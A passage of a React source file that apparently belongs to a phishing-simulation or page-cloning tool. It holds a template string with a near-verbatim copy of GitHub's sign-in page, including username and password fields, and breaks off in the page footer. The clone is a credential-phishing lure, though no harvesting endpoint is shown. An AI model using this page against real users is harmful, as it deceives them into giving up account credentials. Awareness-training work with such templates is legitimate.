import { useState, useEffect } from "react";
import Swal from "../utils/AlertContainer";
import { CiGlobe } from "react-icons/ci";
import { RiPagesLine } from "react-icons/ri";
import UrlImportModal from "./UrlImportModal";

const TEMPLATE_LOGIN_GITHUB = `<!DOCTYPE html>
<html
  lang="en"
  
  data-color-mode="auto" data-light-theme="light" data-dark-theme="dark"
  data-a11y-animated-images="system" data-a11y-link-underlines="true"
  
  >



  <head>
    <meta charset="utf-8">
  <link rel="dns-prefetch" href="https://github.githubassets.com">
  <link rel="dns-prefetch" href="https://avatars.githubusercontent.com">
  <link rel="dns-prefetch" href="https://github-cloud.s3.amazonaws.com">
  <link rel="dns-prefetch" href="https://user-images.githubusercontent.com/">
  <link rel="preconnect" href="https://github.githubassets.com" crossorigin>
  <link rel="preconnect" href="https://avatars.githubusercontent.com">

  

  <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/light-c59dc71e3a4c.css" /><link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/light_high_contrast-4bf0cb726930.css" /><link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/dark-89751e879f8b.css" /><link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/dark_high_contrast-67c7180a598a.css" /><link data-color-theme="light" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/light-c59dc71e3a4c.css" /><link data-color-theme="light_high_contrast" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/light_high_contrast-4bf0cb726930.css" /><link data-color-theme="light_colorblind" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/light_colorblind-6060e905eb78.css" /><link data-color-theme="light_colorblind_high_contrast" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/light_colorblind_high_contrast-04e818620b9c.css" /><link data-color-theme="light_tritanopia" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/light_tritanopia-ae65df249e0f.css" /><link data-color-theme="light_tritanopia_high_contrast" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/light_tritanopia_high_contrast-fdadc12a1ec2.css" /><link data-color-theme="dark" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark-89751e879f8b.css" /><link data-color-theme="dark_high_contrast" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_high_contrast-67c7180a598a.css" /><link data-color-theme="dark_colorblind" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_colorblind-4277e18a7c75.css" /><link data-color-theme="dark_colorblind_high_contrast" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_colorblind_high_contrast-2e33ed61bc8c.css" /><link data-color-theme="dark_tritanopia" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_tritanopia-48d44d87614d.css" /><link data-color-theme="dark_tritanopia_high_contrast" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_tritanopia_high_contrast-6adcb5080302.css" /><link data-color-theme="dark_dimmed" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_dimmed-250cee4c1ea8.css" /><link data-color-theme="dark_dimmed_high_contrast" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_dimmed_high_contrast-e3802beb8c06.css" />


    <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/primer-primitives-225433424a87.css" />
    <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/primer-b4bd0459f984.css" />
    <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/global-059815cb3694.css" />
    <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/github-58ac3ad6cb3f.css" />
  

  


  <script type="application/json" id="client-env">{"locale":"en","featureFlags":["alternate_user_config_repo","api_insights_show_missing_data_banner","appearance_settings","codespaces_prebuild_region_target_update","contact_requests_implicit_opt_in","contentful_lp_flex_features","contentful_lp_footnotes","copilot_chat_attach_multiple_images","copilot_chat_custom_instructions","copilot_chat_repo_custom_instructions_preview","copilot_chat_vision_in_claude","copilot_chat_wholearea_dd","copilot_custom_copilots_feature_preview","copilot_duplicate_thread","copilot_free_to_paid_telem","copilot_ftp_settings_upgrade","copilot_ftp_upgrade_to_pro_from_models","copilot_ftp_your_copilot_settings","copilot_immersive_draft_issue_template_required","copilot_immersive_structured_model_picker","copilot_new_conversation_starters","copilot_new_immersive_references_ui","copilot_no_floating_button","copilot_read_shared_conversation","copilot_showcase_icebreakers","copilot_task_oriented_assistive_prompts","copilot_topics_as_references","copilot_workbench_iterate_panel","copilot_workbench_preview_analytics","copilot_workbench_refresh_on_wsod","copilot_workbench_user_limits","custom_copilots_capi_mode","custom_copilots_issues_prs","direct_to_salesforce","dotcom_chat_client_side_skills","failbot_report_error_react_apps_on_page","ghost_pilot_confidence_truncation_25","ghost_pilot_confidence_truncation_40","insert_before_patch","issues_preserve_tokens_in_urls","issues_react_blur_item_picker_on_close","issues_react_bots_timeline_pagination","issues_react_create_milestone","issues_react_prohibit_title_fallback","issues_react_remove_placeholders","issues_tab_counter_updates","lifecycle_label_name_updates","link_contact_sales_swp_marketo","marketing_pages_search_explore_provider","memex_mwl_filter_field_delimiter","nonreporting_relay_graphql_status_codes","primer_primitives_experimental","primer_react_css_modules_ga","primer_react_select_panel_with_modern_action_list","remove_child_patch","sample_network_conn_type","sanitize_nested_mathjax_macros","site_homepage_contentful","site_msbuild_hide_integrations","site_msbuild_launch","site_msbuild_webgl_hero","spark_commit_on_default_branch","swp_enterprise_contact_form","use_copilot_avatar","use_paginated_repo_picker_cost_center_form","viewscreen_sandbox"]}</script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/high-contrast-cookie-a58297b2ebf8.js"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/wp-runtime-16ed49019a5f.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_oddbird_popover-polyfill_dist_popover-fn_js-a8c266e5f126.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_mini-throttle_dist_index_js-node_modules_stacktrace-parser_dist_s-1d3d52-babac9434833.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/ui_packages_failbot_failbot_ts-7cc3ec44644a.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/environment-89128d48c6ff.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_primer_behaviors_dist_esm_index_mjs-c44edfed7f0d.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_selector-observer_dist_index_esm_js-cdf2757bd188.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_relative-time-element_dist_index_js-5913bc24f35d.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_text-expander-element_dist_index_js-e50fb7a5fe8c.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_auto-complete-element_dist_index_js-node_modules_github_catalyst_-8e9f78-c1e2fb329866.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_filter-input-element_dist_index_js-node_modules_github_remote-inp-d8c643-251bc3964eb6.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_markdown-toolbar-element_dist_index_js-6a8c7d9a08fe.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_file-attachment-element_dist_index_js-node_modules_primer_view-co-cadbad-fad3eaf3c7ec.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/github-elements-2224a8aae785.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/element-registry-bde3cdbe9e92.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_braintree_browser-detection_dist_browser-detection_js-node_modules_githu-bb80ec-34c4b68b1dd3.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_lit-html_lit-html_js-b93a87060d31.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_morphdom_dist_morphdom-esm_js-300e8e4e0414.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_fzy_js_index_js-node_modules_github_paste-markdown_dist_index_js-63a26702fa42.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_turbo_dist_turbo_es2017-esm_js-595819d3686f.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_remote-form_dist_index_js-node_modules_delegated-events_dist_inde-893f9f-1bcf38e06f01.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_color-convert_index_js-1a149db8dc99.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_quote-selection_dist_index_js-node_modules_github_session-resume_-c1aa61-91618cb63471.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/ui_packages_updatable-content_updatable-content_ts-a5daa16ae903.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/app_assets_modules_github_behaviors_task-list_ts-app_assets_modules_github_sso_ts-ui_packages-900dde-f953ddf42948.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/app_assets_modules_github_sticky-scroll-into-view_ts-e45aabc67d13.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/app_assets_modules_github_behaviors_ajax-error_ts-app_assets_modules_github_behaviors_include-d0d0a6-a7da4270c5f4.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/app_assets_modules_github_behaviors_commenting_edit_ts-app_assets_modules_github_behaviors_ht-83c235-567e0f340e27.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/behaviors-d627f8546cd2.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_delegated-events_dist_index_js-node_modules_github_catalyst_lib_index_js-ea8eaa-eefe25567449.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/notifications-global-eadae94940d6.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_mini-throttle_dist_index_js-node_modules_virtualized-list_es_inde-5cfb7e-03a3356911e6.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_filter-input-element_dist_index_js-node_modules_github_remote-inp-3eebbd-c8d976843cc9.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/app_assets_modules_github_ref-selector_ts-4c3b35d0e753.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/app_assets_modules_github_settings_integrations-transfer_ts-app_assets_modules_github_setting-84b62a-cdba3cffda65.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/settings-1745e2c2cce4.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_remote-form_dist_index_js-node_modules_delegated-events_dist_inde-94fd67-99b04cc350b5.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/sessions-eed3aa0554dd.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_delegated-events_dist_index_js-node_modules_github_memoize_dist_esm_inde-455471-ba8d301edeab.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/signup-305a576cc59e.js" defer="defer"></script>
  

  <title>Sign in to GitHub · GitHub</title>



  <meta name="route-pattern" content="/login(.:format)" data-turbo-transient>
  <meta name="route-controller" content="sessions" data-turbo-transient>
  <meta name="route-action" content="new" data-turbo-transient>
  <meta name="fetch-nonce" content="v2:28e7990c-a163-f1c6-1e10-7de0aee529df">

    
  <meta name="current-catalog-service-hash" content="701273d4944fb23919c770da2da3f33b6da9ed8e668f7249090e3e9f429343b5">


  <meta name="request-id" content="DD3B:3D870A:59950:63D77:685BB2FE" data-pjax-transient="true"/><meta name="html-safe-nonce" content="98a350d5d15703443c0fa267905a33383ae36288fd07361cd33f038633afc830" data-pjax-transient="true"/><meta name="visitor-payload" content="eyJyZWZlcnJlciI6IiIsInJlcXVlc3RfaWQiOiJERDNCOjNEODcwQTo1OTk1MDo2M0Q3Nzo2ODVCQjJGRSIsInZpc2l0b3JfaWQiOiI3ODEyODcwNDE4ODYwODQ3ODcwIiwicmVnaW9uX2VkZ2UiOiJzb3V0aGVhc3Rhc2lhIiwicmVnaW9uX3JlbmRlciI6InNvdXRoZWFzdGFzaWEifQ==" data-pjax-transient="true"/><meta name="visitor-hmac" content="6a94ff80acf3f800d07fb4e75fdb7cc99b23d56d3c0e07e9b6ea3ef59a632b7a" data-pjax-transient="true"/>




  <meta name="github-keyboard-shortcuts" content="copilot" data-turbo-transient="true" />
  

  <meta name="selected-link" value="/login" data-turbo-transient>
  <link rel="assets" href="https://github.githubassets.com/">

    <meta name="google-site-verification" content="Apib7-x98H0j5cPqHWwSMm6dNU4GmODRoqxLiDzdx9I">

<meta name="octolytics-url" content="https://collector.github.com/github/collect" />

  <meta name="analytics-location-query-strip" content="true" data-turbo-transient="true" />

  




    <meta name="user-login" content="">

  

    <meta name="viewport" content="width=device-width">

    

      <meta name="description" content="GitHub is where people build software. More than 150 million people use GitHub to discover, fork, and contribute to over 420 million projects.">

      <link rel="search" type="application/opensearchdescription+xml" href="/opensearch.xml" title="GitHub">

    <link rel="fluid-icon" href="https://github.com/fluidicon.png" title="GitHub">
    <meta property="fb:app_id" content="1401488693436528">
    

      <meta property="og:url" content="https://github.com">
  <meta property="og:site_name" content="GitHub">
  <meta property="og:title" content="Build software better, together">
  <meta property="og:description" content="GitHub is where people build software. More than 150 million people use GitHub to discover, fork, and contribute to over 420 million projects.">
  <meta property="og:image" content="https://github.githubassets.com/assets/github-logo-55c5b9a1fe52.png">
  <meta property="og:image:type" content="image/png">
  <meta property="og:image:width" content="1200">
  <meta property="og:image:height" content="1200">
  <meta property="og:image" content="https://github.githubassets.com/assets/github-mark-57519b92ca4e.png">
  <meta property="og:image:type" content="image/png">
  <meta property="og:image:width" content="1200">
  <meta property="og:image:height" content="620">
  <meta property="og:image" content="https://github.githubassets.com/assets/github-octocat-13c86b8b336d.png">
  <meta property="og:image:type" content="image/png">
  <meta property="og:image:width" content="1200">
  <meta property="og:image:height" content="620">

  <meta property="twitter:site" content="github">
  <meta property="twitter:site:id" content="13334762">
  <meta property="twitter:creator" content="github">
  <meta property="twitter:creator:id" content="13334762">
  <meta property="twitter:card" content="summary_large_image">
  <meta property="twitter:title" content="GitHub">
  <meta property="twitter:description" content="GitHub is where people build software. More than 150 million people use GitHub to discover, fork, and contribute to over 420 million projects.">
  <meta property="twitter:image" content="https://github.githubassets.com/assets/github-logo-55c5b9a1fe52.png">
  <meta property="twitter:image:width" content="1200">
  <meta property="twitter:image:height" content="1200">




      <meta name="hostname" content="github.com">



        <meta name="expected-hostname" content="github.com">


  <meta http-equiv="x-pjax-version" content="dcb6c34967bb561718b3259f5cf1ab2ce9d0d0ee1291e0d4b255e2cc92bcc291" data-turbo-track="reload">
  <meta http-equiv="x-pjax-csp-version" content="ef69917d9a42397a02a26afa85fdb5c9b36dc3e4391c077de131cce8087d9717" data-turbo-track="reload">
  <meta http-equiv="x-pjax-css-version" content="f5deb776f7eb657ef9b5707891a044306ba6103f73a02b71646e80dc29a271e7" data-turbo-track="reload">
  <meta http-equiv="x-pjax-js-version" content="d76d85e5d21f21b624d07569e208ed6597c211b88262285fa1e1fea57121122a" data-turbo-track="reload">

  <meta name="turbo-cache-control" content="no-preview" data-turbo-transient="">

      <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/github-58ac3ad6cb3f.css" />



      <link rel="canonical" href="https://github.com/login" data-turbo-transient>


    <meta name="turbo-body-classes" content="logged-out env-production page-responsive session-authentication">


  <meta name="browser-stats-url" content="https://api.github.com/_private/browser/stats">

  <meta name="browser-errors-url" content="https://api.github.com/_private/browser/errors">

  <meta name="release" content="7498682d89092cbf0707e6125a30f1dc6260e365">

  <link rel="mask-icon" href="https://github.githubassets.com/assets/pinned-octocat-093da3e6fa40.svg" color="#000000">
  <link rel="alternate icon" class="js-site-favicon" type="image/png" href="https://github.githubassets.com/favicons/favicon.png">
  <link rel="icon" class="js-site-favicon" type="image/svg+xml" href="https://github.githubassets.com/favicons/favicon.svg" data-base-href="https://github.githubassets.com/favicons/favicon">

<meta name="theme-color" content="#1e2327">
<meta name="color-scheme" content="light dark" />


  <link rel="manifest" href="/manifest.json" crossOrigin="use-credentials">

  </head>

  <body class="logged-out env-production page-responsive session-authentication" style="word-wrap: break-word;">
    <div data-turbo-body class="logged-out env-production page-responsive session-authentication" style="word-wrap: break-word;">
      



    <div class="position-relative header-wrapper js-header-wrapper ">
      <a href="#start-of-content" data-skip-target-assigned="false" class="px-2 py-4 color-bg-accent-emphasis color-fg-on-emphasis show-on-focus js-skip-to-content">Skip to content</a>

      <span data-view-component="true" class="progress-pjax-loader Progress position-fixed width-full">
    <span style="width: 0%;" data-view-component="true" class="Progress-item progress-pjax-loader-bar left-0 top-0 color-bg-accent-emphasis"></span>
</span>      
      
      <script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/primer-react-a57080a0a6e8.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/react-core-3f1b81bf3fb5.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/react-lib-8705026b409a.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/octicons-react-9fd6ca6872cc.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_emotion_is-prop-valid_dist_emotion-is-prop-valid_esm_js-node_modules_emo-b1c483-b5947865157f.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_catalyst_lib_index_js-node_modules_primer_live-region-element_dis-b2aea6-bfc50dd77594.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/ui_packages_ui-commands_ui-commands_ts-94054d5b9c0c.js" defer="defer"></script>
<script crossorigin="anonymous" type="application/javascript" src="https://github.githubassets.com/assets/keyboard-shortcuts-dialog-6bb6aa2945d5.js" defer="defer"></script>
<link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/primer-react.6278980231d1a55c5718.module.css" />
<link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/keyboard-shortcuts-dialog.47de85e2c17af43cefd5.module.css" />

<react-partial
  partial-name="keyboard-shortcuts-dialog"
  data-ssr="false"
  data-attempted-ssr="false"
  data-react-profiling="false"
>
  
  <script type="application/json" data-target="react-partial.embeddedData">{"props":{"docsUrl":"https://docs.github.com/get-started/accessibility/keyboard-shortcuts"}}</script>
  <div data-target="react-partial.reactRoot"></div>
</react-partial>




      

          <div class="header header-logged-out width-full pt-5 pb-4" role="banner">
  <div class="container clearfix width-full text-center">
    <a class="header-logo" href="https://github.com/"  aria-label="Homepage" data-ga-click="(Logged out) Header, go to homepage, icon:logo-wordmark">
      <svg height="48" aria-hidden="true" viewBox="0 0 24 24" version="1.1" width="48" data-view-component="true" class="octicon octicon-mark-github">
    <path d="M12 1C5.923 1 1 5.923 1 12c0 4.867 3.149 8.979 7.521 10.436.55.096.756-.233.756-.522 0-.262-.013-1.128-.013-2.049-2.764.509-3.479-.674-3.699-1.292-.124-.317-.66-1.293-1.127-1.554-.385-.207-.936-.715-.014-.729.866-.014 1.485.797 1.691 1.128.99 1.663 2.571 1.196 3.204.907.096-.715.385-1.196.701-1.471-2.448-.275-5.005-1.224-5.005-5.432 0-1.196.426-2.186 1.128-2.956-.111-.275-.496-1.402.11-2.915 0 0 .921-.288 3.024 1.128a10.193 10.193 0 0 1 2.75-.371c.936 0 1.871.123 2.75.371 2.104-1.43 3.025-1.128 3.025-1.128.605 1.513.221 2.64.111 2.915.701.77 1.127 1.747 1.127 2.956 0 4.222-2.571 5.157-5.019 5.432.399.344.743 1.004.743 2.035 0 1.471-.014 2.654-.014 3.025 0 .289.206.632.756.522C19.851 20.979 23 16.854 23 12c0-6.077-4.922-11-11-11Z"></path>
</svg>
    </a>
  </div>
</div>


      <div hidden="hidden" data-view-component="true" class="js-stale-session-flash stale-session-flash flash flash-warn flash-full">
  
        <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
        <span class="js-stale-session-flash-signed-in" hidden>You signed in with another tab or window. <a class="Link--inTextBlock" href="">Reload</a> to refresh your session.</span>
        <span class="js-stale-session-flash-signed-out" hidden>You signed out in another tab or window. <a class="Link--inTextBlock" href="">Reload</a> to refresh your session.</span>
        <span class="js-stale-session-flash-switched" hidden>You switched accounts on another tab or window. <a class="Link--inTextBlock" href="">Reload</a> to refresh your session.</span>

    <button id="icon-button-79b6331f-82c2-4a81-b847-40914a9fcf8b" aria-labelledby="tooltip-40ae5734-7608-47a2-8583-1e657be6d219" type="button" data-view-component="true" class="Button Button--iconOnly Button--invisible Button--medium flash-close js-flash-close">  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x Button-visual">
    <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
</svg>
</button><tool-tip id="tooltip-40ae5734-7608-47a2-8583-1e657be6d219" for="icon-button-79b6331f-82c2-4a81-b847-40914a9fcf8b" popover="manual" data-direction="s" data-type="label" data-view-component="true" class="sr-only position-absolute">Dismiss alert</tool-tip>


  
</div>
    </div>

  <div id="start-of-content" class="show-on-focus"></div>









    






  <div
    class="application-main "
    data-commit-hovercards-enabled
    data-discussion-hovercards-enabled
    data-issue-and-pr-hovercards-enabled
    data-project-hovercards-enabled
  >
      <main>
        

<div class="auth-form px-3" id="login"  data-hpc>

    <div class="auth-form-header p-0">
      <h1>Sign in to GitHub</h1>
    </div>


    <div id="js-flash-container" class="flash-container" data-turbo-replace>



  <template class="js-flash-template">
    
<div class="flash flash-full   {{ className }}">
  <div >
    <button autofocus class="flash-close js-flash-close" type="button" aria-label="Dismiss this message">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x">
    <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
</svg>
    </button>
    <div aria-atomic="true" role="alert" class="js-flash-alert">
      
      <div>{{ message }}</div>

    </div>
  </div>
</div>
  </template>
</div>


    <div class="flash js-transform-notice" hidden>
      <button class="flash-close js-flash-close" type="button" aria-label="Dismiss this message">
        <svg aria-label="Dismiss" role="img" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x">
    <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
</svg>
      </button>
    </div>

    <div class="auth-form-body mt-3">
      
    <label for="login_field">
      Username or email address
    </label>
    <input type="text" name="login" id="login_field" class="form-control input-block js-login-field" autocapitalize="off" autocorrect="off" autocomplete="username" autofocus="autofocus" required="required" />

  <div class="position-relative">
    <label for="password">
      Password
    </label>
    <input type="password" name="password" id="password" class="form-control form-control input-block js-password-field" autocomplete="current-password" required="required" />
    <a class="label-link position-absolute top-0 right-0" id="forgot-password" href="/password_reset">Forgot password?</a>
    
<input type="hidden" name="webauthn-conditional" value="undefined">
<input type="hidden" class="js-support" name="javascript-support" value="unknown">
<input type="hidden" class="js-webauthn-support" name="webauthn-support" value="unknown">
<input type="hidden" class="js-webauthn-iuvpaa-support" name="webauthn-iuvpaa-support" value="unknown">
<input type="hidden" name="return_to" id="return_to" value="https://github.com/login" autocomplete="off" class="form-control" />
<input type="hidden" name="allow_signup" id="allow_signup" autocomplete="off" class="form-control" />
<input type="hidden" name="client_id" id="client_id" autocomplete="off" class="form-control" />
<input type="hidden" name="integration" id="integration" autocomplete="off" class="form-control" />
<input class="form-control" type="text" name="required_field_6a19" hidden="hidden" />
<input class="form-control" type="hidden" name="timestamp" value="1750840062961" />
<input class="form-control" type="hidden" name="timestamp_secret" value="7ae883589bc6476172e512fa103451c9755f02d37cbbd0b08ed2d5e88b7c2bed" />


    <input type="submit" name="commit" value="Sign in" class="btn btn-primary btn-block js-sign-in-button" data-disable-with="Signing in…" data-signin-label="Sign in" data-sso-label="Sign in with your identity provider" development="false" disable-emu-sso="false" />
  </div>
</form>  <webauthn-status class="js-webauthn-login-emu-control">
      <include-fragment data-target="webauthn-status.fragment" data-src="/u2f/login_fragment?is_emu_login=false" data-nonce="v2:28e7990c-a163-f1c6-1e10-7de0aee529df" data-view-component="true">
  
  <div data-show-on-forbidden-error hidden>
    <div class="Box">
  <div class="blankslate-container">
    <div data-view-component="true" class="blankslate blankslate-spacious color-bg-default rounded-2">
      

      <h3 data-view-component="true" class="blankslate-heading">        Uh oh!
</h3>
      <p data-view-component="true">        <p class="color-fg-muted my-2 mb-2 ws-normal">There was an error while loading. <a class="Link--inTextBlock" data-turbo="false" href="" aria-label="Please reload this page">Please reload this page</a>.</p>
</p>

</div>  </div>
</div>  </div>
</include-fragment>
  </webauthn-status>

    </div>


        <h2 class="sr-only">Password login alternatives</h2>
        <div class="login-callout mt-3">
            <webauthn-subtle class="js-webauthn-subtle" hidden>
    <p class="mb-0 mt-0 js-webauthn-subtle-emu-control">
      <button data-action="click:webauthn-subtle#prompt" type="button" data-view-component="true" class="Button--link Button--medium Button">  <span class="Button-content">
    <span class="Button-label">Sign in with a passkey</span>
  </span>
</button>
    </p>
  </webauthn-subtle>

          <p class="mt-1 mb-0 p-0">
            New to GitHub?
              <a data-ga-click="Sign in, switch to sign up" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;sign in switch to sign up&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;SIGN_UP&quot;,&quot;originating_url&quot;:&quot;https://github.com/login&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="d943b5df3b8e74686b4009e60ef5e059ef46ba02071647af580daec2c03c709e" href="/signup?source=login">Create an account</a>
          </p>
        </div>
</div>

      </main>
  </div>

          <div class="footer container-lg p-responsive py-6 mt-6 f6 d-flex flex-justify-center flex-items-center flex-lg-row flex-wrap flex-lg-nowrap" role="contentinfo">
    <ul class="list-style-none d-flex flex-justify-center flex-wrap mb-2 mb-lg-0">
        <li class="mx-2">
